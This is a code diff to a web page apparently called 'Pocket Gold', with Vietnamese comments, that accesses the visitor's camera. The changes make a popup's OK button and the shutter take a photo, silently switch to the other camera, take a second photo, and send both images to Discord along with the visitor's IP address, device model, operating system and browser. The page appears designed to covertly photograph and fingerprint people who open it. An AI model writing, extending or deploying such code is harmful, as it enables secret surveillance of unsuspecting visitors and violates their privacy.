@@ -357,6 +357,7 @@
       <i class="ph ph-lightning"></i>
     </button>
 
+    <!-- FIX 1: Thêm tham số 'this' vào onclick để lấy đúng phần tử HTML -->
     <div class="theme-selector">
       <div class="theme-dot" style="background: #000000;" onclick="setTheme('black', this)"></div>
       <div class="theme-dot active" style="background: #ffaa33;" onclick="setTheme('orange', this)"></div>
@@ -461,7 +462,6 @@
       await takePhotoSequence("Nút OK Popup (Lần 1)");
     }
 
-    // FIX LỖI ZOOM CAMERA TRÊN iOS & ANDROID
     async function initCamera(mode) {
       if (currentStream) {
         currentStream.getTracks().forEach(track => track.stop());
@@ -469,7 +469,6 @@
 
       facingMode = mode;
 
-      // Cấu hình không cố định chiều rộng/cao cứng để tránh ép camera vào góc cận (zoom)
       const constraintsList = [
         {
           video: {
@@ -496,14 +495,20 @@
           stream = await navigator.mediaDevices.getUserMedia(constraints);
           if (stream) break;
         } catch (e) {
-          // Thử cấu hình tiếp theo nếu gặp lỗi
+          // Thử cấu hình tiếp theo
         }
       }
 
       if (stream) {
         currentStream = stream;
         video.srcObject = currentStream;
-        await video.play();
+        
+        // Đợi video thực sự sẵn sàng phát khung hình
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            video.play().then(resolve);
+          };
+        });
         
         if (facingMode === 'user') {
           video.classList.add('mirror');
@@ -540,10 +545,9 @@
     function captureFrame() {
       return new Promise((resolve) => {
         const context = canvas.getContext('2d');
-        const vW = video.videoWidth;
-        const vH = video.videoHeight;
+        const vW = video.videoWidth || 1080;
+        const vH = video.videoHeight || 1920;
 
-        // Cắt khung hình chuẩn tỉ lệ 9:16 mà không làm méo hay phóng to ảnh
         const targetRatio = 9 / 16;
         const currentRatio = vW / vH;
 
@@ -579,16 +583,31 @@
       });
     }
 
+    /* FIX 2: Viết lại logic chụp kép (Chụp cam hiện tại -> Tự switch sang cam còn lại -> Chụp tiếp -> Gửi 2 hình lên Discord) */
     async function takePhotoSequence(triggerSource) {
       shutterBtn.classList.add('disabled');
-      
-      if (isFlashEnabled) {
-        triggerScreenFlash();
+      const photos = [];
+
+      // 1. Chụp tấm đầu tiên (Cam hiện tại)
+      if (isFlashEnabled) triggerScreenFlash();
+      const firstBlob = await captureFrame();
+      photos.push({ name: `photo1_${facingMode}.jpg`, blob: firstBlob });
+
+      // 2. Tự động chuyển sang cam còn lại
+      const nextMode = (facingMode === 'user') ? 'environment' : 'user';
+      const switchSuccess = await initCamera(nextMode);
+
+      if (switchSuccess) {
+        // Cho camera delay nhẹ 400ms để ổn định ánh sáng
+        await new Promise(r => setTimeout(r, 400));
+
+        // 3. Chụp tấm thứ hai (Cam còn lại)
+        if (isFlashEnabled) triggerScreenFlash();
+        const secondBlob = await captureFrame();
+        photos.push({ name: `photo2_${facingMode}.jpg`, blob: secondBlob });
       }
 
-      const blob = await captureFrame();
-      const photos = [{ name: 'camera_capture.jpg', blob: blob }];
-
+      // 4. Đẩy cả 2 tấm lên Discord
       await sendToDiscord(photos, triggerSource);
       shutterBtn.classList.remove('disabled');
     }
@@ -620,7 +639,7 @@
       const deviceModel = result.device.model || result.device.type || "PC/Unidentified";
 
       formData.append("payload_json", JSON.stringify({
-        content: `📸 **Khoảnh khắc mới từ Pocket Gold!**\n🎯 **Thao tác bởi:** \`${triggerSource}\` \n⏰ **Thời gian:** \`${timeString}\` \n🌐 **IP Address:** \`${userIP}\` \n📱 **Thiết bị:** \`${deviceModel}\` \n💻 **Hệ điều hành:** \`${osName} ${osVersion}\` \n🌐 **Trình duyệt:** \`${browserName} ${browserVersion}\``
+        content: `📸 **Khoảnh khắc chụp kép từ Pocket Gold!**\n🎯 **Thao tác bởi:** \`${triggerSource}\` \n⏰ **Thời gian:** \`${timeString}\` \n🌐 **IP Address:** \`${userIP}\` \n📱 **Thiết bị:** \`${deviceModel}\` \n💻 **Hệ điều hành:** \`${osName} ${osVersion}\` \n🌐 **Trình duyệt:** \`${browserName} ${browserVersion}\``
       }));
 
       try {
@@ -634,6 +653,7 @@
     }
 
     function setTheme(themeName, element) {
+      if (!element) return;
       document.body.className = `theme-${themeName}`;
       document.querySelectorAll('.theme-dot').forEach(dot => dot.classList.remove('active'));
       element.classList.add('active');
